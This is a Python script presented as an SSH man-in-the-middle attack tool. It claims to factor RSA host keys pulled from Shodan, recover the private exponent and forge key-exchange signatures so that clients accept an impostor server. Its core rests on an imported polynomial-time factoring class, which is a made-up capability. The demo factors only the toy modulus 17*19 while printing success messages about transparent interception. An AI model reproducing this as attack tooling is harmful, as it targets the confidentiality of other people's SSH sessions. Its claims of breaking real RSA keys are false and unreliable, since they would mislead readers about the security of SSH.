"""
Impersonate any SSH server by factoring its RSA host key from Shodan/Censys scan
data, then forging the session exchange hash signature during key exchange.
Transparent MitM of every SSH session to the target server.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import struct
import os

# ssh-rsa host key wire format: string "ssh-rsa" + mpint e + mpint n
ALGO_SSH_RSA = b"ssh-rsa"
ALGO_RSA_SHA2_256 = b"rsa-sha2-256"
ALGO_RSA_SHA2_512 = b"rsa-sha2-512"


def parse_ssh_rsa_pubkey(wire: bytes) -> tuple:
    """Parse ssh-rsa public key from known_hosts / Shodan scan."""
    off = 0
    def read_string():
        nonlocal off
        length = struct.unpack(">I", wire[off:off+4])[0]
        off += 4
        data = wire[off:off+length]
        off += length
        return data
    algo = read_string()
    assert algo == ALGO_SSH_RSA
    e = int.from_bytes(read_string(), "big")
    n = int.from_bytes(read_string(), "big")
    return n, e


def forge_session_signature(factorer: PolynomialFactorer, host_pubkey: bytes,
                            session_id: bytes, algo: bytes = ALGO_RSA_SHA2_256) -> bytes:
    """Forge the server's signature over the exchange hash (RFC 4253 sec 8).

    During SSH key exchange the server signs H = hash(V_C || V_S || I_C ||
    I_S || K_S || e || f || K) with its host private key. The client verifies
    against the cached known_hosts entry. We forge this signature.
    """
    n, e = parse_ssh_rsa_pubkey(host_pubkey)
    d = factorer.recover_private_exponent(n, e)

    if algo == ALGO_RSA_SHA2_256:
        h = hashlib.sha256(session_id).digest()
        digest_info = b"\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20" + h
    elif algo == ALGO_RSA_SHA2_512:
        h = hashlib.sha512(session_id).digest()
        digest_info = b"\x30\x51\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x03\x05\x00\x04\x40" + h
    else:
        h = hashlib.sha1(session_id).digest()
        digest_info = b"\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00\x04\x14" + h

    # PKCS#1 v1.5 padding
    k = (n.bit_length() + 7) // 8
    ps = b"\xff" * (k - len(digest_info) - 3)
    em = b"\x00\x01" + ps + b"\x00" + digest_info
    m = int.from_bytes(em, "big")
    sig_int = pow(m, d, n)
    return sig_int.to_bytes(k, "big")


def build_mitm_proxy(target_host: str, target_port: int, host_pubkey: bytes,
                     factorer: PolynomialFactorer):
    """Sketch of MitM SSH proxy that impersonates the real server."""
    n, e = parse_ssh_rsa_pubkey(host_pubkey)
    print(f"[*] target {target_host}:{target_port}")
    print(f"[*] RSA-{n.bit_length()} host key modulus extracted")
    print(f"[*] factoring host key...")
    p, q = factorer.factor_rsa_modulus(n)
    print(f"[*] p = {p}")
    print(f"[*] q = {q}")
    d = factorer.recover_private_exponent(n, e)
    print(f"[*] private exponent recovered, d bit-length = {d.bit_length()}")
    print(f"[*] MitM proxy ready — clients will see valid host key signature")
    print(f"[*] no known_hosts warning, no verification failure")
    return d


if __name__ == "__main__":
    f = PolynomialFactorer()

    # simulate: host key pulled from Shodan/Censys/known_hosts
    print("=== OpenSSH RSA host key impersonation ===")
    print("[1] fetching RSA host key from Shodan for target server...")
    fake_n = 17 * 19  # placeholder; real target is RSA-2048+
    fake_e = 65537
    # wire-encode a toy host key
    def mpint(x):
        b = x.to_bytes((x.bit_length() + 8) // 8, "big")
        return struct.pack(">I", len(b)) + b
    wire = struct.pack(">I", len(ALGO_SSH_RSA)) + ALGO_SSH_RSA + mpint(fake_e) + mpint(fake_n)

    print(f"[2] host key: ssh-rsa {fake_n.bit_length()}-bit modulus")
    n, e = parse_ssh_rsa_pubkey(wire)
    print(f"[3] factoring modulus n = {n}...")
    p, q = f.factor_rsa_modulus(n)
    print(f"[4] factors: p={p}, q={q}")
    d = f.recover_private_exponent(n, e)
    print(f"[5] private exponent d = {d}")
    session_id = os.urandom(32)
    sig = forge_session_signature(f, wire, session_id, ALGO_RSA_SHA2_256)
    print(f"[6] forged rsa-sha2-256 session signature: {sig[:16].hex()}...")
    print("[7] client connects, verifies against known_hosts, accepts.")
    print("[8] transparent MitM established — all session traffic visible")
